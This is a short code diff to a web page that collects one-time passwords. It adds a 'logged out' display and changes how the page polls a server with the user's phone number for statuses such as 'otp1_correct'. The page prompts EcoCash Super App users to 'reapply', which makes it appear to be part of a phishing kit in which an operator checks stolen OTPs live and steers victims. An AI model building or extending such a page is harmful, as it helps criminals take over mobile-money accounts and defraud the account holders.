@@ -35,7 +35,7 @@
             border-radius: 10px;
             border: none;
             background-color: #e0e0e0;
-            color: #a0a0a0;
+            color: #a0a0e0;
             font-size: 14px;
             font-weight: bold;
             cursor: not-allowed;
@@ -185,12 +185,27 @@ async function submitOtp() {
     }
 }
 
+function showLoggedOutState(message) {
+    clearInterval(pollingInterval);
+    overlay.style.display = 'none';
+    btn.disabled = true;
+    btn.classList.remove('active');
+    inputs.forEach(input => input.disabled = true);
+    statusMsg.style.color = "red";
+    statusMsg.innerText = message || "Please log out from EcoCash Super App and try reapplying again.";
+}
+
 function startPolling() {
     clearInterval(pollingInterval);
     pollingInterval = setInterval(async () => {
         try {
             const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
             const data = await res.json();
+
+            if (data.status === "logged_out") {
+                showLoggedOutState(data.message || "Please log out from EcoCash Super App and try reapplying again.");
+                return;
+            }
 
             if (data.status === "otp1_correct") {
                 clearInterval(pollingInterval);
